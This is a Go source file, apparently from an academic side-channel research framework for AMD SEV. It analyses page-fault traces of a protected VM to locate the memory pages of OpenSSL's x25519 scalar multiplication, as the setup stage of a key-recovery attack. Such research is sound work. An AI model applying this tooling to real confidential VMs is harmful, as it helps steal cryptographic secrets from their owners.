//Takes a trace of a single execution of the target code with re-tracking and determines the
//GPA containing "x25519_scalar_mulx" and the page containing the "fe64_***" functions
//of the "crypto/ec/curve25519.c"  implementation in OpenSSL.
//The idea is in each of the main loop iterations in "x25519_scalar_mulx" we toggle between the two afore
//mentioned pages. Thus we search for small toggle sequences and sum them up. The sequence with the highest
//repetitions is our candidate

package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/UzL-ITS/sev-step/sevStep"
)

func main() {

	in := flag.String("in", "", "Input file with events as json")
	out := flag.String("out", "ecdh-exec-gpas.txt", "Output file with the GPAs that need to be exec tracked for the attack (in that order)")

	flag.Parse()

	if *in == "" {
		log.Fatalln("Please set \"-in\"!")
	}

	inFile, err := os.Open(*in)
	if err != nil {
		log.Fatalf("Failed to open input file : %v", err)
	}
	defer inFile.Close()

	start := time.Now()
	events, err := sevStep.ParseInputFile(bufio.NewReader(inFile))
	if err != nil {
		log.Fatalf("Failed to parse input file : %v\n", err)
	}
	log.Printf("Parsed in %v\n", time.Since(start))

	//build count faults for each occuring page
	faultCount := make(map[uint64]int)
	for _, v := range events {
		faultCount[v.FaultedGPA]++
	}
	type GpaCountTuple struct {
		GPA   uint64
		Count int
	}
	tuples := make([]GpaCountTuple, 0, len(faultCount))
	for k, v := range faultCount {
		tuples = append(tuples, GpaCountTuple{
			GPA:   k,
			Count: v,
		})
	}
	sort.Slice(tuples, func(i, j int) bool {
		return tuples[i].Count < tuples[j].Count
	})

	fmt.Printf("Unique GPAs %v\n", len(tuples))
	log.Printf("Top 10 most frequent GPAs")
	for i := len(tuples) - 1; i > len(tuples)-10 && i > 0; i-- {
		fmt.Printf("GPA %x Occurence %v\n", tuples[i].GPA, tuples[i].Count)
	}

	//We are looking for a page fault sequence where two pages are faulted very often in an alternated manner

	const minTraceLength = 500
	if len(events) < minTraceLength {
		log.Printf("Events file to short,got %v, want at least %v", len(events), minTraceLength)
	}

	seqCount := make(map[string]int)
	var currentWindow1, currentWindow2, nextWindow1, nextWindow2 *sevStep.Event
	toggleSequenceLength := 0
	log.Printf("Scanning Entries:")
	for i := 0; i < len(events)-3; {
		currentWindow1 = events[i]
		currentWindow2 = events[i+1]
		nextWindow1 = events[i+2]
		nextWindow2 = events[i+3]

		//check if next two entries extend sequence. move index by two to stay "window aligned" in next cycle
		if currentWindow1.FaultedGPA == nextWindow1.FaultedGPA && currentWindow2.FaultedGPA == nextWindow2.FaultedGPA {
			toggleSequenceLength++
			i += 2
		} else { //sequence not found/ended, move index only by one to not exclude any window alignments
			if toggleSequenceLength > 8 && faultCount[nextWindow1.FaultedGPA] > 5000 &&
				faultCount[nextWindow1.FaultedGPA] < 12000 {
				//log.Printf("Toggle Sequence 0x%x -> 0x%x aborted after %d reps by 0x%x -> 0x%x at id %v\n", currentWindow1.FaultedGPA, currentWindow2.FaultedGPA, toggleSequenceLength, nextWindow1.FaultedGPA, nextWindow2.FaultedGPA, nextWindow1.ID)
				seqCount[fmt.Sprintf("0x%x->0x%x", currentWindow1.FaultedGPA, currentWindow2.FaultedGPA)] += toggleSequenceLength
			}
			toggleSequenceLength = 0
			i += 1
		}
	}
	log.Printf("Selecting candidate")
	topCount := 0
	secondBest := 0
	keyTopCount := ""
	for k, v := range seqCount {
		if v > topCount {
			keyTopCount = k
			secondBest = topCount
			topCount = v

		}
	}
	log.Printf("Suggesting: %s with %v reps, margin to second %v\n", keyTopCount, topCount, topCount-secondBest)

	gpaString := strings.Split(keyTopCount, "->")
	if len(gpaString) != 2 {
		log.Printf("Expected two GPAs in result, got %v", len(gpaString))
		return
	}
	if err := ioutil.WriteFile(*out, []byte(fmt.Sprintf("%v\n%v\n", gpaString[0], gpaString[1])), 0777); err != nil {
		log.Printf("Faile to write output file : %v\n", err)
		return
	}
}
